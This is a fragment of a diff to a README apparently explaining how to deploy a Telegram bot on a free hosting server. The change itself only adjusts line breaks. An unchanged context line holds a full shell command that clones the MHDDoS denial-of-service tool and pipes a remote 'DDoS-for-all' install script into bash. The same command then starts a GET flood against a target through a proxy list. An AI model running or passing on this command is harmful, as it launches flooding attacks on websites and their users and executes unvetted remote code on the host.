@@ -12,9 +12,7 @@ and make a NUM variable with the name of the bot.
 In the shell of your hosting server make this config command : 
 <br>
 ` /usr/bin/python3 -m pip install --upgrade pip && pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET example.com 1 100 mhddos_proxy/list 100 5 `
-
-<br><br>
-
+<br>
 Now hit the URL of the bot for start (only if your hosting sleep your project in free mode like Glitch), you can also make a bot for start all other bot. 
 
 
